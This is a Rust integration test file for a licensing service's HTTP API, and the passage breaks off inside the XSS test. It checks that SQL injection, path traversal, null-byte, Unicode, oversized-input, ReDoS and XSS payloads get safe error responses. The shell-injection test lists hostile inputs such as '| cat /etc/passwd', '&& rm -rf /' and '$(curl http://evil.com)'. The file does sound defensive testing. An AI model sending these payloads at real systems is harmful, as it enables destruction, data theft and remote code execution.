//! Security tests for input validation, SQL injection prevention, and encoding attacks.
//!
//! These tests verify that:
//! 1. SQL injection payloads in path parameters are handled safely (parameterized queries)
//! 2. Path traversal attempts are rejected or handled safely
//! 3. Unicode/encoding attacks don't cause unexpected behavior
//! 4. Input size limits are enforced to prevent DoS attacks
//!
//! The goal is to verify the system doesn't crash and returns appropriate error codes.
//! For SQL injection, we verify queries return 404 (not found) rather than executing
//! malicious SQL, confirming parameterized queries work correctly.

use axum::{
    Router,
    body::Body,
    http::{Request, StatusCode},
};
use serde_json::{Value, json};
use tower::ServiceExt;

#[path = "../common/mod.rs"]
mod common;
use common::{*, ONE_MONTH, ONE_YEAR};

use paycheck::db::AppState;
use paycheck::handlers;
use paycheck::models::{OperatorRole, OrgMemberRole};

use r2d2::Pool;
use r2d2_sqlite::SqliteConnectionManager;

// ============================================================================
// Test App Setup Helpers
// ============================================================================

/// Creates a test app with the full org router (with middleware)
fn org_app() -> (Router, AppState) {
    let master_key = test_master_key();

    let manager = SqliteConnectionManager::memory();
    let pool = Pool::builder().max_size(4).build(manager).unwrap();
    {
        let conn = pool.get().unwrap();
        paycheck::db::init_db(&conn).unwrap();
    }

    let audit_manager = SqliteConnectionManager::memory();
    let audit_pool = Pool::builder().max_size(4).build(audit_manager).unwrap();
    {
        let conn = audit_pool.get().unwrap();
        paycheck::db::init_audit_db(&conn).unwrap();
    }

    let state = AppState {
        db: pool,
        audit: audit_pool,
        base_url: "http://localhost:3000".to_string(),
        audit_log_enabled: false,
        master_key,
        email_hasher: paycheck::crypto::EmailHasher::from_bytes([0xAA; 32]),
        success_page_url: "http://localhost:3000/success".to_string(),
        activation_rate_limiter: std::sync::Arc::new(
            paycheck::rate_limit::ActivationRateLimiter::default(),
        ),
        email_service: std::sync::Arc::new(paycheck::email::EmailService::new(
            None,
            "test@example.com".to_string(),
        )),
        jwks_cache: std::sync::Arc::new(paycheck::jwt::JwksCache::new()),
        trusted_issuers: vec![],
    };

    let app = handlers::orgs::router(state.clone(), paycheck::config::RateLimitConfig::disabled())
        .with_state(state.clone());

    (app, state)
}

/// Creates a test app with the full operator router (with middleware)
fn operator_app() -> (Router, AppState) {
    let master_key = test_master_key();

    let manager = SqliteConnectionManager::memory();
    let pool = Pool::builder().max_size(4).build(manager).unwrap();
    {
        let conn = pool.get().unwrap();
        paycheck::db::init_db(&conn).unwrap();
    }

    let audit_manager = SqliteConnectionManager::memory();
    let audit_pool = Pool::builder().max_size(4).build(audit_manager).unwrap();
    {
        let conn = audit_pool.get().unwrap();
        paycheck::db::init_audit_db(&conn).unwrap();
    }

    let state = AppState {
        db: pool,
        audit: audit_pool,
        base_url: "http://localhost:3000".to_string(),
        audit_log_enabled: false,
        master_key,
        email_hasher: paycheck::crypto::EmailHasher::from_bytes([0xAA; 32]),
        success_page_url: "http://localhost:3000/success".to_string(),
        activation_rate_limiter: std::sync::Arc::new(
            paycheck::rate_limit::ActivationRateLimiter::default(),
        ),
        email_service: std::sync::Arc::new(paycheck::email::EmailService::new(
            None,
            "test@example.com".to_string(),
        )),
        jwks_cache: std::sync::Arc::new(paycheck::jwt::JwksCache::new()),
        trusted_issuers: vec![],
    };

    let app = handlers::operators::router(state.clone()).with_state(state.clone());

    (app, state)
}

/// Helper to parse response body as JSON
async fn body_json(response: axum::response::Response) -> Value {
    let body = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    serde_json::from_slice(&body)
        .unwrap_or_else(|_| json!({ "raw": String::from_utf8_lossy(&body).to_string() }))
}

/// Helper to URL-encode a string for use in paths
fn url_encode(s: &str) -> String {
    urlencoding::encode(s).to_string()
}

// ============================================================================
// SQL INJECTION PREVENTION TESTS
// ============================================================================

mod sql_injection {
    use super::*;

    /// Test that SQL injection payloads in org_id path parameter are handled safely.
    /// The system should return 401 (no valid org membership) or 404 (org not found),
    /// NOT execute the malicious SQL.
    #[tokio::test]
    async fn test_sql_injection_in_org_id_returns_4xx_not_500() {
        let (app, state) = org_app();

        // Create a valid authenticated user
        let api_key: String;
        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Legit Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            let encoded_payload = url_encode(payload);

            // Try to access /orgs/{sql_injection_payload}/members
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/orgs/{}/members", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 401 (not a member of fake org) or 404 (org not found)
            // NOT a 500 error or successful execution of SQL
            assert!(
                response.status() == StatusCode::UNAUTHORIZED
                    || response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::FORBIDDEN,
                "SQL injection in org_id: payload '{}' should return 401/403/404 (safe rejection), got {} - parameterized queries may have failed",
                payload,
                response.status()
            );
        }
    }

    /// Test that SQL injection payloads in project_id path parameter are handled safely.
    #[tokio::test]
    async fn test_sql_injection_in_project_id_returns_4xx_not_500() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            // Create a real project so the org exists
            let _ = create_test_project(&conn, &org.id, "Real Project", &master_key);

            org_id = org.id;
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            let encoded_payload = url_encode(payload);

            // Try to access /orgs/{org}/projects/{sql_injection}/products
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/products",
                            org_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 404 (project not found) or 403 (forbidden)
            // NOT a 500 error or successful execution of SQL
            assert!(
                response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::FORBIDDEN
                    || response.status() == StatusCode::BAD_REQUEST,
                "SQL injection in project_id: payload '{}' should return 400/403/404 (safe rejection), got {} - parameterized queries may have failed",
                payload,
                response.status()
            );
        }
    }

    /// Test that SQL injection in user_id when creating org member is handled safely.
    #[tokio::test]
    async fn test_sql_injection_in_user_id_body_returns_4xx_not_500() {
        let (app, state) = org_app();

        let org_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);

            org_id = org.id;
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            // Try to create org member with malicious user_id
            let body = json!({
                "user_id": payload,
                "role": "member"
            });

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri(format!("/orgs/{}/members", org_id))
                        .header("content-type", "application/json")
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::from(serde_json::to_string(&body).unwrap()))
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 400 (bad request) or 404 (user not found)
            // NOT a 500 error or successful execution of SQL
            assert!(
                response.status() == StatusCode::BAD_REQUEST
                    || response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::UNPROCESSABLE_ENTITY,
                "SQL injection in user_id body field: payload '{}' should return 400/404/422 (safe rejection), got {} - parameterized queries may have failed",
                payload,
                response.status()
            );
        }
    }

    /// Test that SQL injection in license_id path parameter is handled safely.
    #[tokio::test]
    async fn test_sql_injection_in_license_id_returns_4xx_not_500() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            let encoded_payload = url_encode(payload);

            // Try to get license with malicious ID
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/licenses/{}",
                            org_id, project_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 404 (license not found)
            // NOT a 500 error or data from other tables
            assert!(
                response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "SQL injection in license_id: payload '{}' should return 400/404 (safe rejection), got {} - may have leaked data from other tables",
                payload,
                response.status()
            );
        }
    }

    /// Test that SQL injection in email query parameter for license search is handled safely.
    #[tokio::test]
    async fn test_sql_injection_in_email_query_returns_empty_or_error() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);
            let product = create_test_product(&conn, &project.id, "Pro", "pro");
            // Create a real license to ensure the endpoint works
            let _ =
                create_test_license(&conn, &project.id, &product.id, Some(future_timestamp(ONE_MONTH)));

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            let encoded_payload = url_encode(payload);

            // Try to search licenses with malicious email parameter
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/licenses?email={}",
                            org_id, project_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 200 with empty results or 400 (bad request)
            // NOT a 500 error or leaked data
            assert!(
                response.status() == StatusCode::OK || response.status() == StatusCode::BAD_REQUEST,
                "SQL injection in email query param: payload '{}' should return 200 (empty) or 400 (rejected), got {} - possible data leak or crash",
                payload,
                response.status()
            );

            // If 200, verify we got empty results (no SQL injection succeeded)
            if response.status() == StatusCode::OK {
                let json = body_json(response).await;
                let items = json["items"].as_array();
                // SQL injection shouldn't return extra data
                if let Some(items) = items {
                    assert!(
                        items.is_empty(),
                        "SQL injection in email query param: payload '{}' returned {} items - UNION/subquery injection may have succeeded",
                        payload,
                        items.len()
                    );
                }
            }
        }
    }

    /// Test SQL injection in operator user lookup.
    #[tokio::test]
    async fn test_sql_injection_in_operator_user_lookup_returns_4xx_not_500() {
        let (app, state) = operator_app();

        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let (_, _, key) = create_test_operator(&conn, "owner@test.com", OperatorRole::Owner);
            api_key = key;
        }

        for payload in sql_injection_payloads() {
            let encoded_payload = url_encode(payload);

            // Try to get user with malicious ID
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/users/{}", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should get 404 (user not found)
            assert!(
                response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "SQL injection in operator user lookup: payload '{}' should return 400/404 (safe rejection), got {} - parameterized queries may have failed",
                payload,
                response.status()
            );
        }
    }
}

// ============================================================================
// PATH TRAVERSAL PREVENTION TESTS
// ============================================================================

mod path_traversal {
    use super::*;

    /// Test that path traversal attempts in org_id are rejected.
    #[tokio::test]
    async fn test_path_traversal_in_org_id_returns_4xx_not_500() {
        let (app, state) = org_app();

        let api_key: String;
        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Legit Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            api_key = key;
        }

        for payload in path_traversal_payloads() {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/orgs/{}/members", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Path traversal should not lead to file system access
            // Should get 401/403/404, NOT 200 or 500
            assert!(
                response.status() == StatusCode::UNAUTHORIZED
                    || response.status() == StatusCode::FORBIDDEN
                    || response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "Path traversal in org_id: payload '{}' should return 400/401/403/404 (safe rejection), got {} - may have accessed filesystem",
                payload,
                response.status()
            );
        }
    }

    /// Test that path traversal attempts in project_id are rejected.
    #[tokio::test]
    async fn test_path_traversal_in_project_id_returns_4xx_not_500() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            let _ = create_test_project(&conn, &org.id, "Real Project", &master_key);

            org_id = org.id;
            api_key = key;
        }

        for payload in path_traversal_payloads() {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/products",
                            org_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should be handled as a regular "not found" case
            assert!(
                response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::FORBIDDEN
                    || response.status() == StatusCode::BAD_REQUEST,
                "Path traversal in project_id: payload '{}' should return 400/403/404 (safe rejection), got {} - may have accessed filesystem",
                payload,
                response.status()
            );
        }
    }

    /// Test path traversal in license_id.
    #[tokio::test]
    async fn test_path_traversal_in_license_id_returns_4xx_not_500() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        for payload in path_traversal_payloads() {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/licenses/{}",
                            org_id, project_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            assert!(
                response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "Path traversal in license_id: payload '{}' should return 400/404 (safe rejection), got {} - may have accessed filesystem",
                payload,
                response.status()
            );
        }
    }
}

// ============================================================================
// UNICODE/ENCODING ATTACKS TESTS
// ============================================================================

mod unicode_attacks {
    use super::*;

    /// Test that null bytes in IDs are rejected or handled safely.
    #[tokio::test]
    async fn test_null_byte_in_id_returns_4xx_not_500() {
        let (app, state) = org_app();

        let api_key: String;
        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            api_key = key;
        }

        // Test null byte injection
        let null_byte_payloads = vec![
            "valid-id\x00malicious",
            "\x00",
            "test\x00\x00test",
            "%00",
            "id%00admin",
        ];

        for payload in null_byte_payloads {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/orgs/{}/members", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should not crash, should return appropriate error
            assert!(
                response.status() != StatusCode::INTERNAL_SERVER_ERROR,
                "Null byte injection: payload should not cause 500 error (server crash or unhandled exception)"
            );
            assert!(
                response.status() == StatusCode::UNAUTHORIZED
                    || response.status() == StatusCode::FORBIDDEN
                    || response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "Null byte injection in org_id: payload '{}' should return 400/401/403/404 (safe rejection), got {} - string truncation may have occurred",
                payload,
                response.status()
            );
        }
    }

    /// Test that RTL override characters don't cause issues.
    #[tokio::test]
    async fn test_unicode_rtl_override_does_not_crash() {
        let (app, state) = org_app();

        let api_key: String;
        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            api_key = key;
        }

        for payload in unicode_attack_payloads() {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/orgs/{}/members", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Unicode attacks should not crash the server
            assert!(
                response.status() != StatusCode::INTERNAL_SERVER_ERROR,
                "Unicode attack (RTL override/homoglyph/BOM): payload should not cause 500 error (server crash or encoding failure)"
            );
        }
    }

    /// Test unicode in request body fields.
    #[tokio::test]
    async fn test_unicode_in_body_fields_does_not_crash() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        for payload in unicode_attack_payloads() {
            // Try creating a product with unicode attack in name
            let body = json!({
                "name": payload,
                "tier": "pro",
                "license_exp_days": ONE_YEAR,
                "updates_exp_days": ONE_YEAR,
                "activation_limit": 5,
                "device_limit": 3,
                "features": []
            });

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri(format!("/orgs/{}/projects/{}/products", org_id, project_id))
                        .header("content-type", "application/json")
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::from(serde_json::to_string(&body).unwrap()))
                        .unwrap(),
                )
                .await
                .unwrap();

            // Should either accept (if unicode is allowed in names) or reject gracefully
            assert!(
                response.status() != StatusCode::INTERNAL_SERVER_ERROR,
                "Unicode attack in product name: payload should not cause 500 error (server crash or encoding failure)"
            );
        }
    }
}

// ============================================================================
// INPUT SIZE LIMITS TESTS
// ============================================================================

mod input_size_limits {
    use super::*;

    /// Test that oversized organization name is rejected.
    #[tokio::test]
    async fn test_oversized_org_name_returns_error_not_crash() {
        let (app, state) = operator_app();

        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let (_, _, key) = create_test_operator(&conn, "owner@test.com", OperatorRole::Owner);
            api_key = key;
        }

        // Create org with very long name (10000 characters)
        let oversized_name = "A".repeat(10000);

        let body = json!({
            "name": oversized_name
        });

        let response = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/organizations")
                    .header("content-type", "application/json")
                    .header("Authorization", format!("Bearer {}", api_key))
                    .body(Body::from(serde_json::to_string(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();

        // Should either reject (400) or accept (if no limit) but not crash
        assert!(
            response.status() != StatusCode::INTERNAL_SERVER_ERROR,
            "Oversized org name (10000 chars): should not cause 500 error (memory exhaustion or crash)"
        );
    }

    /// Test that oversized features array is rejected.
    #[tokio::test]
    async fn test_oversized_features_array_returns_error_not_crash() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        // Create product with 10000 features
        let features: Vec<String> = (0..10000).map(|i| format!("feature_{}", i)).collect();

        let body = json!({
            "name": "Test Product",
            "tier": "pro",
            "license_exp_days": ONE_YEAR,
            "updates_exp_days": ONE_YEAR,
            "activation_limit": 5,
            "device_limit": 3,
            "features": features
        });

        let response = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(format!("/orgs/{}/projects/{}/products", org_id, project_id))
                    .header("content-type", "application/json")
                    .header("Authorization", format!("Bearer {}", api_key))
                    .body(Body::from(serde_json::to_string(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();

        // Should either reject (400) or accept (if no limit) but not crash
        assert!(
            response.status() != StatusCode::INTERNAL_SERVER_ERROR,
            "Oversized features array (10000 items): should not cause 500 error (memory exhaustion or JSON parsing failure)"
        );
    }

    /// Test that oversized request body is rejected.
    #[tokio::test]
    async fn test_oversized_request_body_returns_error_not_crash() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        // Create a ~10MB request body
        let large_string = "X".repeat(10 * 1024 * 1024);
        let body = json!({
            "name": large_string,
            "tier": "pro",
            "license_exp_days": ONE_YEAR,
            "updates_exp_days": ONE_YEAR,
            "activation_limit": 5,
            "device_limit": 3,
            "features": []
        });

        let response = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(format!("/orgs/{}/projects/{}/products", org_id, project_id))
                    .header("content-type", "application/json")
                    .header("Authorization", format!("Bearer {}", api_key))
                    .body(Body::from(serde_json::to_string(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();

        // Should reject with 413 (Payload Too Large) or 400 (Bad Request)
        // NOT accept the oversized payload or crash with 500
        assert!(
            response.status() == StatusCode::PAYLOAD_TOO_LARGE
                || response.status() == StatusCode::BAD_REQUEST
                || response.status() == StatusCode::OK, // If no limit configured
            "Oversized request body (~10MB): should return 400/413 (rejected) or 200 (accepted), got {} - unexpected error handling",
            response.status()
        );
        assert!(
            response.status() != StatusCode::INTERNAL_SERVER_ERROR,
            "Oversized request body (~10MB): should not cause 500 error (memory exhaustion or DoS)"
        );
    }

    /// Test that deeply nested JSON is handled safely.
    #[tokio::test]
    async fn test_deeply_nested_json_does_not_stack_overflow() {
        let (app, state) = org_app();

        let api_key: String;
        let org_id: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            org_id = org.id;
            api_key = key;
        }

        // Create deeply nested JSON (100 levels)
        let mut nested = json!({ "value": "deep" });
        for _ in 0..100 {
            nested = json!({ "nested": nested });
        }

        let body = json!({
            "user_id": "some-user-id",
            "role": "member",
            "metadata": nested
        });

        let response = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(format!("/orgs/{}/members", org_id))
                    .header("content-type", "application/json")
                    .header("Authorization", format!("Bearer {}", api_key))
                    .body(Body::from(serde_json::to_string(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();

        // Should either parse (extra fields ignored) or reject
        // NOT crash with stack overflow
        assert!(
            response.status() != StatusCode::INTERNAL_SERVER_ERROR,
            "Deeply nested JSON (100 levels): should not cause 500 error (stack overflow or recursion limit)"
        );
    }

    /// Test that very long string in query parameter is handled.
    #[tokio::test]
    async fn test_oversized_query_parameter_does_not_crash() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        // Very long email query parameter
        let long_email = format!("{}@example.com", "a".repeat(10000));

        let response = app
            .oneshot(
                Request::builder()
                    .method("GET")
                    .uri(format!(
                        "/orgs/{}/projects/{}/licenses?email={}",
                        org_id, project_id, long_email
                    ))
                    .header("Authorization", format!("Bearer {}", api_key))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();

        // Should handle gracefully
        assert!(
            response.status() != StatusCode::INTERNAL_SERVER_ERROR,
            "Oversized query parameter (10000 char email): should not cause 500 error (memory exhaustion or URL parsing failure)"
        );
    }
}

// ============================================================================
// SPECIAL CHARACTER HANDLING TESTS
// ============================================================================

mod special_characters {
    use super::*;

    /// Test that special shell characters in IDs don't cause issues.
    #[tokio::test]
    async fn test_shell_metacharacters_in_id_rejected_as_invalid() {
        let (app, state) = org_app();

        let api_key: String;
        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "user@test.com", OrgMemberRole::Owner);
            api_key = key;
        }

        let shell_payloads = vec![
            "$(whoami)",
            "`id`",
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "$(curl http://evil.com)",
            "${PATH}",
            "\\n\\r",
        ];

        for payload in shell_payloads {
            let encoded_payload = url_encode(payload);

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!("/orgs/{}/members", encoded_payload))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();

            // Shell metacharacters should not be executed
            assert!(
                response.status() == StatusCode::UNAUTHORIZED
                    || response.status() == StatusCode::FORBIDDEN
                    || response.status() == StatusCode::NOT_FOUND
                    || response.status() == StatusCode::BAD_REQUEST,
                "Shell injection in org_id: payload '{}' should return 400/401/403/404 (safe rejection), got {} - command injection may have occurred",
                payload,
                response.status()
            );
        }
    }

    /// Test that regex special characters don't cause ReDoS.
    #[tokio::test]
    async fn test_regex_payload_does_not_cause_redos() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        // Payloads that could cause ReDoS if improperly used in regex
        let regex_payloads = vec![
            "a]a]a]a]a]a]a]a]a]a]a",
            "(a+)+$",
            "((a+)+)+$",
            ".*.*.*.*.*.*.*.*.*.*",
            "[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*",
        ];

        for payload in regex_payloads {
            let encoded_payload = url_encode(payload);

            let start = std::time::Instant::now();
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("GET")
                        .uri(format!(
                            "/orgs/{}/projects/{}/licenses?email={}",
                            org_id, project_id, encoded_payload
                        ))
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            let elapsed = start.elapsed();

            // Should complete quickly (< 1 second), not hang due to ReDoS
            const REDOS_TIMEOUT_SECS: u64 = 1;
            assert!(
                elapsed.as_secs() < REDOS_TIMEOUT_SECS,
                "Regex payload '{}' took {:?} (>= {}s), possible ReDoS vulnerability",
                payload,
                elapsed,
                REDOS_TIMEOUT_SECS
            );
            assert!(
                response.status() != StatusCode::INTERNAL_SERVER_ERROR,
                "ReDoS payload in email query param: should not cause 500 error (regex engine failure)"
            );
        }
    }

    /// Test that HTML/XSS payloads in input are handled safely.
    #[tokio::test]
    async fn test_html_xss_payloads_stored_without_execution() {
        let (app, state) = org_app();
        let master_key = test_master_key();

        let org_id: String;
        let project_id: String;
        let api_key: String;

        {
            let conn = state.db.get().unwrap();
            let org = create_test_org(&conn, "Test Org");
            let (_, _, key) =
                create_test_org_member(&conn, &org.id, "owner@test.com", OrgMemberRole::Owner);
            let project = create_test_project(&conn, &org.id, "Test Project", &master_key);

            org_id = org.id;
            project_id = project.id;
            api_key = key;
        }

        let xss_payloads = vec![
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<svg onload=alert('xss')>",
        ];

        for payload in &xss_payloads {
            // Test in product name
            let body = json!({
                "name": payload,
                "tier": "pro",
                "license_exp_days": ONE_YEAR,
                "updates_exp_days": ONE_YEAR,
                "activation_limit": 5,
                "device_limit": 3,
                "features": []
            });

            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .method("POST")
                        .uri(format!("/orgs/{}/projects/{}/products", org_id, project_id))
                        .header("content-type", "application/json")
                        .header("Authorization", format!("Bearer {}", api_key))
                        .body(Body::from(serde_json::to_string(&body).unwrap()))
                        .unwrap(),
                )
                .await
                .unwrap();

            // API should either accept (stored as-is, escaped on output) or reject
            // NOT crash
            assert!(
                response.status() != StatusCode::INTERNAL_SERVER_ERROR,
                "XSS payload in product name: should not cause 500 error (parsing failure or unhandled exception)"
            );

            // If accepted, verify it's stored as-is (API doesn't execute HTML)
            if response.status() == StatusCode::OK {
                let json = body_json(response).await;
